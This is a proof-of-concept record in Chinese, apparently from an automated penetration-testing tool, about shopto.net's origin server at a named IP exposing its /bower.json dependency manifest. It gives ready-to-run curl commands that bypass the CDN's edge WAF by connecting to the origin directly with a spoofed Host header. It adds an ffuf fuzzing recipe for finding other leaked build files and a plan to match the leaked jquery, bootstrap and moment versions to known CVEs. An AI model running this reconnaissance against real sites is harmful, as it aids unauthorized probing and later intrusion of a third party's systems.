# shopto.net 源站 3.8.196.174 默认 vhost /bower.json 匿名可读，泄露 dcshop 前端包名与全部依赖版本（同目录 composer.json/.lock 被 403）

- **code**: shopto-origin-bower-json-dependency-disclosure
- **kind**: poc
- **category**: info-leak
- **component**: DcCMS 2015 / dcshop storefront（Apache + 多 vhost 源站，CDN 前置于 CloudFront）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 15:45-16:10 UTC，ARTEX 执行机 curl 8.5.0（ffuf 2.3.0 辅助铺面），--noproxy '*' 直连源站 3.8.196.174:443，Host 头设 localhost：GET /bower.json → HTTP/1.1 200 OK、Server: Apache、Content-Length 629、Content-Type application/json，正文为构建清单 JSON（name/version/dependencies，含 jquery ~1.9.1、bootstrap ~3.3.7、font-awesome 4.7.0、moment 2.20.1、eonasdan-bootstrap-datetimepicker ^4.17.47）。对照：随机不存在路径 → 404；同目录 /composer.json 与 /composer.lock → 403（.htaccess 名称规则保护）。据此判定 /bower.json 为被遗漏、未纳入保护且公网可读的构建清单，finding_checks.verdict=verified。
- **path**: pocs/shopto-origin-bower-json-dependency-disclosure/poc.md
- **tags**: info-expose, bower.json, dependency-disclosure, dcshop, dccms, origin-direct, vhost, build-manifest, version-fingerprint
- **created_at**: 2026-11-11T16:15:23.037Z
- **engine**: https://3.8.196.174（shopto.net 源站，Host: localhost）

## 描述

原理：源站默认 vhost 根目录遗留了 bower 前端构建清单，未像同目录 composer.json/.lock 那样被 .htaccess 名称规则拦截，导致匿名可读。价值：直接给出 CMS/商家前端包名与全部前端依赖及版本，可用于对目标前端组件做定向 CVE 匹配（如 jquery 1.9.1 / bootstrap 3.3.7 / moment 2.20.1 的历史漏洞）。适用面：任何仍以 bower 管理前端的旧站（多为 DcCMS 系 dcshop 店铺），且源站可直连绕边缘 WAF。

## 用法

```
前置条件：
1) 能直连源站 IP:443（本例 3.8.196.174，为 CDN 源站；直连可绕边缘 WAF，本机挂代理时必须 --noproxy '*' 直连，否则打不到源站）；
2) curl 带 -k 忽略自签/不匹配证书，旧 nginx/Apache vhost 建议 --http1.0；
3) Host 头设任意非业务 vhost 值（如 localhost）或任一子域，命中默认 vhost。

【1) 直取构建清单】
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://<源站IP>/bower.json -w '\n%{http_code} %{size_download}\n'

【2) 规律化铺面（找同类遗漏项）】
ffuf -u https://<源站IP>/FUZZ -H 'Host: localhost' -k -w <wordlist> -mc 200 -fs <默认404字节数>
候选名：bower.json / package.json / package-lock.json / yarn.lock / composer.json / composer.lock / .bowerrc / gulpfile.js / Gruntfile.js

判据：
- 200 + Content-Type application/json + 正文含 {"name":..., "dependencies":{...}} ⇒ 命中，依赖版本即情报；
- 对照同目录 composer.json/.lock = 403 ⇒ 证明该文件是被 .htaccess 名称规则遗漏，而非有意公开（写报告时用得上）；
- 随机不存在路径应 404，用来排除"整站兜底 200"的假象。

常见失败原因：
- 不带 -k / 不用 --noproxy '*' ⇒ 打到 CDN 边缘或证书校验失败，看不到源站；
- Host 设成真实业务域名 ⇒ 落到主站 vhost，返回主站 404；
- 该文件已被补齐保护 ⇒ 返回 403/404（此时结论失效）。

样本正文（脱敏后）：
{"name":"<包名>","version":"1.2.0","dependencies":{"normalize-css":"~v4.2.0","jquery":"~1.9.1","bootstrap":"~3.3.7","font-awesome":"4.7.0","moment":"2.20.1","eonasdan-bootstrap-datetimepicker":"^4.17.47"},"private":true}
```

## 正文

```
# shopto.net 源站 /bower.json 依赖清单匿名泄露

## 前置
- 直连源站 IP:443（CloudFront 源站，直连绕边缘 WAF）
- `curl -k`（忽略证书）；本机挂代理时加 `--noproxy '*'` 直连
- 请求头 `Host` 设任意非业务值（如 localhost）命中默认 vhost
- 旧 vhost 建议 `--http1.0`

## 复现
```bash
# 命中
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
     https://3.8.196.174/bower.json -w '\n%{http_code} %{size_download}\n'
```

命中回显：
```
HTTP/1.1 200 OK
Server: Apache
Content-Length: 629
Content-Type: application/json

{
  "name": "<dcshop 商家前端包名>",
  "version": "1.2.0",
  "dependencies": {
    "normalize-css": "~v4.2.0",
    "jquery": "~1.9.1",
    "bootstrap": "~3.3.7",
    "font-awesome": "4.7.0",
    "moment": "2.20.1",
    "eonasdan-bootstrap-datetimepicker": "^4.17.47"
  },
  "private": true
}
```

## 对照判据
```bash
# 同目录相似文件被名称规则保护
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/composer.json -o /dev/null -w '%{http_code}\n'   # → 403
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/composer.lock -o /dev/null -w '%{http_code}\n'   # → 403
# 随机不存在路径
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/nope-xyz -o /dev/null -w '%{http_code}\n'          # → 404
```
- `bower.json` = 200 且返回 JSON 依赖清单，而 `composer.json/.lock` = 403 ⇒ 判定 `bower.json` 属被遗漏、未纳入 `.htaccess` 名称保护的构建清单，而非有意公开。
- 随机路径 404 ⇒ 排除"整站兜底 200"假象。

## 铺面（找同类遗漏）
```bash
ffuf -u https://3.8.196.174/FUZZ -H 'Host: localhost' -k -w <wordlist> -mc 200 -fs <默认404字节数>
# 候选：bower.json package.json package-lock.json yarn.lock composer.json composer.lock .bowerrc gulpfile.js Gruntfile.js
```

## 利用方向
拿到前端依赖版本后，与公开 CVE 库比对（如 jquery 1.9.1 / bootstrap 3.3.7 / moment 2.20.1），对前端组件做定向漏洞匹配。

## 证伪条件
再次请求 `/bower.json` 返回 403/404（保护已补齐），或返回内容不含包名/依赖版本 ⇒ 本结论不成立。

```
